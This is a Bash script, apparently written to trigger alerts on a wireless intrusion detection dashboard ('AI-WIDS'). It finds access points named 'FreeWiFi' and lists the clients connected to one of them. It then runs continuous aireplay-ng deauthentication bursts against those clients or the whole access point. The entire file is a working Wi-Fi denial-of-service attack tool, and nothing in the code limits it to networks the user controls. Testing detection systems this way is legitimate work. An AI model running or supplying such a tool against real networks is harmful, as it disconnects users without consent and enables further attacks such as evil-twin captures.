#!/usr/bin/env bash

set -euo pipefail

RED='\033[0;31m'; YLW='\033[1;33m'; GRN='\033[0;32m'
CYN='\033[0;36m'; BLD='\033[1m'; NC='\033[0m'

# ── CONFIG ────────────────────────────────────────────────────────────────────
TARGET_SSID="FreeWiFi"
MON_IFACE="wlan0mon"          # monitor interface (TL-WN722N after airmon-ng)
SCAN_SECS=20                  # seconds to scan for the AP
CLIENT_SCAN_SECS=12           # seconds to discover connected clients
RESCAN_SECS=6                 # quick channel rescan after aireplay-ng exits

# ── STATE ─────────────────────────────────────────────────────────────────────
AP_BSSID=""
AP_CHANNEL=""
CLIENT_MACS=()
INJECT_PID=""
TMPDIR_=""
STOPPING=0          # set to 1 by cleanup trap so inject loop can exit cleanly

# ── HELPERS ───────────────────────────────────────────────────────────────────
banner() {
  echo -e "${RED}"
  echo "AI-WIDS  —  Deauth Injector"
  echo "TL-WN722N (AR9271)  │  FreeWiFi target"
  echo "Targeted: clients of TRUSTED AP only"
  echo -e "${NC}"
}

cleanup() {
  STOPPING=1
  echo -e "\n${CYN}[*] Stopping injection...${NC}"
  [[ -n "${INJECT_PID:-}" ]] && kill "$INJECT_PID" 2>/dev/null || true
  [[ -n "${TMPDIR_:-}"    ]] && rm -rf "$TMPDIR_"  2>/dev/null || true
  stty sane 2>/dev/null || true
  echo -e "${GRN}[+] Done.${NC}"
}
trap cleanup EXIT INT TERM

# ── STEP 1 — Check wlan0mon is in monitor mode ────────────────────────────────
check_monitor() {
  echo -e "${CYN}[1] Checking monitor interface...${NC}"
  if ! iwconfig "$MON_IFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
    echo -e "${RED}[!] ${MON_IFACE} is not in monitor mode.${NC}"
    echo -e "${YLW}    Run: sudo airmon-ng start wlx18a6f7110f62${NC}"
    exit 1
  fi
  echo -e "${GRN}[+] ${MON_IFACE} — Monitor mode OK${NC}"
}

# ── STEP 2 — Run a timed airodump-ng scan, return CSV path ───────────────────
# Usage: run_scan <secs> <csv_base> [extra airodump args...]
run_scan() {
  local secs="$1"
  local csv_base="$2"
  shift 2

  airodump-ng --output-format csv --write-interval 1 \
    --write "$csv_base" "$@" "$MON_IFACE" &>/dev/null &
  local pid=$!

  for i in $(seq "$secs" -1 1); do
    printf "\r  %2ds remaining..." "$i"
    sleep 1
  done
  printf "\n"

  kill "$pid" 2>/dev/null || true
  wait "$pid" 2>/dev/null || true
  stty sane 2>/dev/null || true
}

# ── STEP 3 — Find all FreeWiFi APs, let user pick the trusted one ─────────────
scan_ap() {
  echo -e "${CYN}[2] Scanning for '${TARGET_SSID}' APs (${SCAN_SECS}s)...${NC}"
  TMPDIR_=$(mktemp -d /tmp/inject_XXXX)
  local csv_base="${TMPDIR_}/scan"

  run_scan "$SCAN_SECS" "$csv_base" --band bg

  local csv="${csv_base}-01.csv"
  if [[ ! -f "$csv" ]]; then
    echo -e "${RED}[!] No scan output. Check airodump-ng permissions (setcap).${NC}"
    exit 1
  fi

  mapfile -t ap_lines < <(
    awk -F',' '
      /^Station MAC/ { exit }
      NF >= 14 { essid=$14; gsub(/^ +| +$/, "", essid); if (essid == "'"$TARGET_SSID"'") print $0 }
    ' "$csv"
  )

  if [[ ${#ap_lines[@]} -eq 0 ]]; then
    echo -e "${RED}[!] '${TARGET_SSID}' not found. Is the hotspot ON?${NC}"
    echo -e "${YLW}    Other SSIDs seen:${NC}"
    awk -F',' 'NF>=14 && $14~/[A-Za-z0-9]/ {essid=$14; gsub(/^ +| +$/,"",essid); print "    "essid}' "$csv" \
      | sort -u | head -10
    exit 1
  fi

  if [[ ${#ap_lines[@]} -eq 1 ]]; then
    # Only one — use it directly
    AP_BSSID=$(echo "${ap_lines[0]}" | awk -F',' '{print $1}' | tr -d ' ')
    AP_CHANNEL=$(echo "${ap_lines[0]}" | awk -F',' '{print $4}' | tr -d ' ')
    echo -e "${GRN}[+] Found '${TARGET_SSID}' — BSSID: ${AP_BSSID}  CH: ${AP_CHANNEL}${NC}"
    return
  fi

  # Multiple FreeWiFi APs found — show menu
  echo -e "\n${YLW}[!] Multiple '${TARGET_SSID}' APs detected (one may be an evil twin):${NC}\n"
  echo -e "    ${BLD}#   BSSID              CH   Privacy${NC}"
  local i=1
  local bssids=()
  local channels=()
  for line in "${ap_lines[@]}"; do
    local bssid ch priv
    bssid=$(echo "$line" | awk -F',' '{print $1}' | tr -d ' ')
    ch=$(echo "$line" | awk -F',' '{print $4}' | tr -d ' ')
    priv=$(echo "$line" | awk -F',' '{print $6}' | tr -d ' ')
    echo -e "    ${GRN}${i})${NC}  ${bssid}   ${ch}    ${priv}"
    bssids+=("$bssid")
    channels+=("$ch")
    (( i++ ))
  done

  echo ""
  local choice
  read -rp "    Enter number of the TRUSTED AP [1]: " choice
  choice="${choice:-1}"

  if ! [[ "$choice" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > ${#bssids[@]} )); then
    echo -e "${RED}[!] Invalid choice.${NC}"
    exit 1
  fi

  AP_BSSID="${bssids[$((choice-1))]}"
  AP_CHANNEL="${channels[$((choice-1))]}"
  echo -e "${GRN}[+] Selected TRUSTED AP — BSSID: ${AP_BSSID}  CH: ${AP_CHANNEL}${NC}"
}

# ── STEP 4 — Set wlan0mon to the AP's channel ─────────────────────────────────
lock_channel() {
  local ch="$1"
  iw dev "$MON_IFACE" set channel "$ch" 2>/dev/null || true
  sleep 0.3
}

# ── STEP 5 — Scan for clients of the trusted AP ───────────────────────────────
scan_clients() {
  echo -e "${CYN}[3] Scanning for clients connected to ${AP_BSSID} (${CLIENT_SCAN_SECS}s)...${NC}"
  lock_channel "$AP_CHANNEL"

  local csv_base="${TMPDIR_}/clients"
  run_scan "$CLIENT_SCAN_SECS" "$csv_base" --bssid "$AP_BSSID"

  local csv="${csv_base}-01.csv"
  if [[ ! -f "$csv" ]]; then
    echo -e "${YLW}[~] No client scan output — will use broadcast deauth.${NC}"
    CLIENT_MACS=()
    return
  fi

  mapfile -t CLIENT_MACS < <(
    awk -F',' '
      /^Station MAC/ { in_stations=1; next }
      in_stations && NF >= 6 {
        bssid=$6; gsub(/^ +| +$/, "", bssid)
        mac=$1;   gsub(/^ +| +$/, "", mac)
        if (bssid == "'"$AP_BSSID"'") print mac
      }
    ' "$csv"
  )

  if [[ ${#CLIENT_MACS[@]} -eq 0 ]]; then
    echo -e "${YLW}[~] No clients associated yet — will use broadcast deauth (targets all stations on AP).${NC}"
  else
    echo -e "${GRN}[+] Found ${#CLIENT_MACS[@]} client(s) on trusted AP:${NC}"
    for mac in "${CLIENT_MACS[@]}"; do
      echo -e "    ${CYN}→ ${mac}${NC}"
    done
  fi
}

# ── STEP 6 — Quick channel rescan (sequential, no concurrent airodump) ────────
rescan_channel() {
  echo -e "${YLW}[~] Re-scanning for AP channel (${RESCAN_SECS}s)...${NC}"
  stty sane 2>/dev/null || true

  local csv_base="${TMPDIR_}/rescan_$$"
  run_scan "$RESCAN_SECS" "$csv_base" --bssid "$AP_BSSID"

  local csv="${csv_base}-01.csv"
  if [[ -f "$csv" ]]; then
    local new_ch
    new_ch=$(grep -i "$AP_BSSID" "$csv" 2>/dev/null \
             | head -1 | awk -F',' '{print $4}' | tr -d ' \r' || true)
    if [[ -n "$new_ch" && "$new_ch" != "$AP_CHANNEL" ]]; then
      echo -e "${YLW}[~] AP moved: CH ${AP_CHANNEL} → ${new_ch}${NC}"
      AP_CHANNEL="$new_ch"
    fi
  fi

  lock_channel "$AP_CHANNEL"
  echo -e "${GRN}[+] Locked on CH ${AP_CHANNEL}${NC}"
}

# ── STEP 7 — Injection loop (sequential: inject → rescan → repeat) ────────────
inject() {
  # Build aireplay-ng args
  local base_args=('-0' '0' '-a' "$AP_BSSID")
  local target_desc

  if [[ ${#CLIENT_MACS[@]} -eq 0 ]]; then
    # Broadcast — targets all stations associated with the AP
    target_desc="broadcast (all clients of ${AP_BSSID})"
  else
    # Add -c for each client
    target_desc="targeted (${#CLIENT_MACS[@]} client(s))"
    for mac in "${CLIENT_MACS[@]}"; do
      base_args+=('-c' "$mac")
    done
  fi

  echo -e ""
  echo -e "${RED}╔══════════════════════════════════════════════╗${NC}"
  echo -e "${RED}║  STARTING DEAUTH INJECTION                   ║${NC}"
  echo -e "${RED}║  AP BSSID : ${AP_BSSID}               ║${NC}"
  echo -e "${RED}║  Channel  : ${AP_CHANNEL}                              ║${NC}"
  echo -e "${RED}║  Mode     : ${target_desc}${NC}"
  echo -e "${RED}╚══════════════════════════════════════════════╝${NC}"
  echo -e "${YLW}  Dashboard should show DEAUTH ATTACK alert.${NC}"
  echo -e "${YLW}  Press Ctrl+C to stop.\n${NC}"

  lock_channel "$AP_CHANNEL"

  local burst=0
  while true; do
    burst=$(( burst + 1 ))
    echo -e "${RED}[>] Burst ${burst}  │ CH ${AP_CHANNEL}  │ AP ${AP_BSSID}${NC}"

    # Run aireplay-ng — foreground (no concurrent scanner running)
    aireplay-ng "${base_args[@]}" "$MON_IFACE" &
    INJECT_PID=$!
    wait "$INJECT_PID" || true
    INJECT_PID=""

    stty sane 2>/dev/null || true

    # Stop if Ctrl+C was pressed (cleanup trap sets STOPPING=1)
    [[ "$STOPPING" -eq 1 ]] && break

    echo -e "${YLW}[~] aireplay-ng exited — resyncing channel...${NC}"
    rescan_channel
  done
}

# ── MAIN ──────────────────────────────────────────────────────────────────────
banner
check_monitor
scan_ap
scan_clients
inject

